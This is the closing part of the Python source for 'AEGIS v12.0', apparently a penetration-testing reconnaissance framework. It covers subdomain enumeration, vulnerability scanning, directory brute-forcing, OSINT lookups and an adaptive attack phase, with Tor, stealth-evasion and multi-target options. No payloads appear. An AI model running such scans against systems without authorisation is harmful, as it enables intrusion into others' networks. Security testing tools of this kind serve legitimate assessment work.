        cprint(f"  [green]✓[/green] {open_n} open ports found")

    async def _phase_subdomains(self, http: HTTPClient):
        cprint("[bold cyan]  ◈ Phase 5:[/bold cyan] Subdomain enumeration…")
        enumer = SubdomainEnum(self.config, http)
        self.results.subdomains = await enumer.run()
        alive = sum(1 for s in self.results.subdomains if s.alive)
        cprint(f"  [green]✓[/green] {len(self.results.subdomains)} subdomains · {alive} alive")

    async def _phase_vulns(self, http: HTTPClient):
        cprint("[bold cyan]  ◈ Phase 6:[/bold cyan] Vulnerability scanning…")
        scanner = VulnScanner(self.config, http)
        vulns   = await scanner.scan_all(self.results.crawl)
        self.results.vulns.extend(vulns)
        crit = sum(1 for v in self.results.vulns if v.severity in ("critical","high"))
        cprint(f"  [green]✓[/green] {len(vulns)} vulnerabilities · {crit} critical/high")

    async def _phase_dirbust(self, http: HTTPClient):
        cprint("[bold cyan]  ◈ Phase 7:[/bold cyan] Directory brute-force…")
        buster  = DirBuster(self.config, http)
        custom_words = None
        if self.config.wordlist and self.config.wordlist.exists():
            custom_words = self.config.wordlist.read_text().splitlines()
        found = await buster.run(self.config.target, custom_words)
        # Add to crawl results (as partial entries)
        for item in found:
            existing = {c.url for c in self.results.crawl}
            if item["url"] not in existing:
                self.results.crawl.append(CrawlResult(
                    url=item["url"], status_code=item["status"],
                    size=item.get("size",0), title=item.get("title",""),
                ))
        cprint(f"  [green]✓[/green] {len(found)} interesting paths found")

    async def _phase_osint(self, http: HTTPClient):
        cprint("[bold cyan]  ◈ Phase 8:[/bold cyan] OSINT lookups…")
        osint_mod = OSINTModule(self.config, http)
        osint     = await osint_mod.run(self.config.target)
        self.results.osint = osint
        self.results.whois = osint.pop("whois", {})
        cprint(f"  [green]✓[/green] OSINT complete ({len(osint)} sources)")

    async def _phase_advanced(self, http: HTTPClient):
        """Phase 11: Novel & adaptive attacks."""
        engine = AdvancedAttackModule(self.config, self._adaptive)
        findings = await engine.run(http, self.results)
        self.results.vulns = (self.results.vulns or []) + findings
        # Update adaptive profile in results
        self.results.adaptive_summary = self._adaptive.get_summary()
        cprint("[dim]  Adaptive engine summary: WAF={waf} blocks={b} successes={s}[/dim]".format(
            waf=self._adaptive.profile.waf_name or "none",
            b=self._adaptive.profile.block_count,
            s=self._adaptive.profile.success_count,
        ))

    async def _phase_plugins(self):
        if not self.config.plugins_dir:
            return
        cprint("[bold cyan]  ◈ Phase 9:[/bold cyan] Running plugins…")
        pm = PluginManager(self.config.plugins_dir)
        pm.load()
        if pm.plugins:
            await pm.run_all(self.results, self.config)
            cprint(f"  [green]✓[/green] {len(pm.plugins)} plugin(s) ran")

    # ─────────────────────────────────────────────────
    # SUMMARY
    # ─────────────────────────────────────────────────

    def _print_summary(self):
        r   = self.results
        ml  = r.ml_scores
        CONSOLE.rule()
        cprint(f"\n[bold cyan]  AEGIS SCAN COMPLETE[/bold cyan]  [{r.duration:.1f}s]")
        cprint(f"  Target   : [cyan]{r.target}[/cyan]")
        cprint(f"  Output   : [cyan]{self.config.output_dir}[/cyan]")
        CONSOLE.rule()
        cprint(f"  [bold]URLs crawled     :[/bold] {len(r.crawl)}")
        cprint(f"  [bold]Vulnerabilities  :[/bold] {len(r.vulns)}")
        sev_c = Counter(v.severity for v in r.vulns)
        for sev in ("critical","high","medium","low","info"):
            if sev_c[sev]:
                col = SEVERITY_COLORS.get(sev,"dim")
                cprint(f"      [{col}]{sev.upper()}: {sev_c[sev]}[/{col}]")
        cprint(f"  [bold]Data Leaks       :[/bold] {len(r.findings)}")
        cprint(f"  [bold]Subdomains       :[/bold] {len(r.subdomains)}")
        cprint(f"  [bold]Open Ports       :[/bold] {sum(1 for p in r.ports if p.state=='open')}")
        cprint(f"  [bold]DNS Records      :[/bold] {len(r.dns)}")
        cprint(f"  [bold]Technologies     :[/bold] {len(r.technologies)}")
        if ml:
            risk  = ml.get("risk_level","INFO")
            score = ml.get("overall",0)
            cprint(f"  [bold]Risk Score (ML)  :[/bold] {score:.1f}/10 [{risk}]")
        CONSOLE.rule()
        cprint(f"\n  [green]Report:[/green] {self.config.output_dir / 'report.html'}\n")

        # Print top vulns
        if r.vulns:
            cprint("[bold yellow]  TOP VULNERABILITIES[/bold yellow]")
            shown = sorted(r.vulns, key=lambda v: -severity_score(v.severity))[:10]
            for v in shown:
                col = SEVERITY_COLORS.get(v.severity,"dim")
                cprint(f"  [{col}][{v.severity.upper()}][/{col}] {v.vuln_type} @ {v.url[:60]}")

        # Print top findings
        if r.findings:
            cprint("\n[bold yellow]  TOP DATA LEAKS[/bold yellow]")
            for f in sorted(r.findings, key=lambda x: -severity_score(x.severity))[:5]:
                col = SEVERITY_COLORS.get(f.severity,"dim")
                cprint(f"  [{col}][{f.severity.upper()}][/{col}] {f.category}: {f.value[:50]}")

        CONSOLE.rule()


# ════════════════════════════════════════════════════════
# CLI ARGUMENT PARSER
# ════════════════════════════════════════════════════════

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="aegis",
        description="AEGIS v12.0 — Advanced Reconnaissance Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    p.add_argument("-t","--target",       required=True,  help="Target URL or IP")
    p.add_argument("--threads",           type=int, default=50, help="Concurrency (default: 50)")
    p.add_argument("--depth",             type=int, default=3,  help="Crawl depth (default: 3)")
    p.add_argument("--timeout",           type=int, default=10, help="Request timeout (default: 10)")
    p.add_argument("--output",            default=None,    help="Output directory")
    p.add_argument("--wordlist",          default=None,    help="Custom wordlist file")
    p.add_argument("--proxy",             default=None,    help="HTTP/SOCKS5 proxy URL")
    p.add_argument("--tor",               action="store_true", help="Route through Tor")
    p.add_argument("--stealth",           action="store_true", help="Low-and-slow evasive mode")
    p.add_argument("--full",              action="store_true", help="Enable all modules")
    p.add_argument("--ml",                action="store_true", help="ML-based risk scoring")
    p.add_argument("--distributed",       action="store_true", help="Distributed scan mode")
    p.add_argument("--plugins",           default=None,    help="Plugins directory")
    # Module flags
    p.add_argument("--no-ports",          action="store_true", help="Skip port scan")
    p.add_argument("--no-subdomains",     action="store_true", help="Skip subdomain enum")
    p.add_argument("--no-vulns",          action="store_true", help="Skip vuln scan")
    p.add_argument("--no-osint",          action="store_true", help="Skip OSINT lookups")
    p.add_argument("--no-ssl",            action="store_true", help="Skip SSL analysis")
    # OSINT keys
    p.add_argument("--shodan",            default=None,    help="Shodan API key",          metavar="KEY")
    p.add_argument("--vt",                default=None,    help="VirusTotal API key",      metavar="KEY")
    p.add_argument("--censys-id",         default=None,    help="Censys API ID",           metavar="ID",  dest="censys_id")
    p.add_argument("--censys-secret",     default=None,    help="Censys API secret",       metavar="SEC", dest="censys_secret")
    p.add_argument("--greynoise",         default=None,    help="GreyNoise API key",       metavar="KEY")
    p.add_argument("--hunter",            default=None,    help="Hunter.io API key",       metavar="KEY")
    p.add_argument("--securitytrails",    default=None,    help="SecurityTrails API key",  metavar="KEY", dest="securitytrails")
    p.add_argument("--serve",             action="store_true", help="Auto-host HTML report after scan (default port 7331)")
    p.add_argument("--serve-port",        default=7331,     type=int, help="Port for auto-host server", metavar="PORT", dest="serve_port")
    return p


def parse_target(raw: str) -> str:
    """Ensure target has a scheme."""
    raw = raw.strip()
    if not raw.startswith(("http://","https://")):
        raw = "https://" + raw
    return raw


# ════════════════════════════════════════════════════════
# SIGNAL HANDLER
# ════════════════════════════════════════════════════════

_ABORT_EVENT = asyncio.Event() if False else None  # created in main

def _handle_sigint(sig, frame):
    cprint("\n[yellow]  Interrupt received — saving partial results…[/yellow]")
    if _ABORT_EVENT:
        _ABORT_EVENT.set()


# ════════════════════════════════════════════════════════
# MAIN ENTRY POINT
# ════════════════════════════════════════════════════════

async def _amain(args) -> int:
    global _ABORT_EVENT
    _ABORT_EVENT = asyncio.Event()
    signal.signal(signal.SIGINT, _handle_sigint)

    target = parse_target(args.target)

    config = ScanConfig(
        target             = target,
        threads            = args.threads,
        depth              = args.depth,
        timeout            = args.timeout,
        output_dir         = Path(args.output) if args.output else None,
        wordlist           = Path(args.wordlist) if args.wordlist else None,
        proxy              = args.proxy,
        use_tor            = args.tor,
        stealth            = args.stealth,
        full_scan          = args.full,
        ml_enabled         = args.ml,
        distributed        = args.distributed,
        shodan_key         = args.shodan,
        vt_key             = args.vt,
        censys_id          = args.censys_id,
        censys_secret      = args.censys_secret,
        greynoise_key      = args.greynoise,
        hunter_key         = args.hunter,
        securitytrails_key = args.securitytrails,
        scan_ports         = not args.no_ports,
        scan_subdomains    = not args.no_subdomains,
        scan_vulns         = not args.no_vulns,
        scan_osint         = not args.no_osint,
        scan_ssl           = not args.no_ssl,
        plugins_dir        = Path(args.plugins) if args.plugins else None,
    )

    if args.distributed:
        # Distributed mode: read additional targets from stdin
        cprint("[cyan]  Distributed mode — reading extra targets from stdin (one per line, Ctrl+D to start):[/cyan]")
        extra = []
        with suppress(EOFError):
            while True:
                line = input()
                if line.strip():
                    extra.append(parse_target(line.strip()))
        all_targets = [target] + extra
        coord   = DistributedCoordinator(all_targets, config)
        results = await coord.run()
        cprint(f"[bold green]  Distributed scan complete: {len(results)} targets[/bold green]")
        # Merge summary
        total_vulns = sum(len(r.vulns) for r in results)
        cprint(f"  Total vulnerabilities: {total_vulns}")
    else:
        aegis = AEGIS(config)
        await aegis.run()

    return 0


def serve_report(output_dir: str, port: int = 7331):
    """Spawn a simple HTTP server to host the scan report."""
    import http.server as _hs
    import threading as _threading
    import webbrowser as _wb

    class _Handler(_hs.SimpleHTTPRequestHandler):
        def __init__(self, *a, **kw):
            super().__init__(*a, directory=str(output_dir), **kw)
        def log_message(self, fmt, *args):
            pass  # silence access logs

    def _run():
        with _hs.HTTPServer(("0.0.0.0", port), _Handler) as srv:
            srv.serve_forever()

    t = _threading.Thread(target=_run, daemon=True)
    t.start()
    url = "http://127.0.0.1:{}/report.html".format(port)
    cprint("[bold green]  Report server live →[/bold green] [link={}]{}[/link]".format(url, url))
    try:
        _wb.open(url)
    except Exception as _exc:
        log.debug("_run: %s", _exc)
    return url


def main():
    parser = build_parser()
    args   = parser.parse_args()
    # Validate target
    if not args.target:
        parser.print_help()
        sys.exit(1)
    try:
        exit_code = asyncio.run(_amain(args))
        if getattr(args, "serve", False):
            # Determine output dir
            _out = getattr(args, "output", None) or "aegis_output"
            _port = getattr(args, "serve_port", 7331)
            serve_report(_out, _port)
            cprint("[dim]  Press Ctrl+C to stop the server.[/dim]")
            try:
                import time as _t
                while True:
                    _t.sleep(1)
            except KeyboardInterrupt:
                pass
        sys.exit(exit_code)
    except KeyboardInterrupt:
        cprint("\n[yellow]Interrupted.[/yellow]")
        sys.exit(130)
    except Exception as exc:
        cprint(f"[bold red]Fatal error:[/bold red] {exc}")
        if os.environ.get("AEGIS_DEBUG"):
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
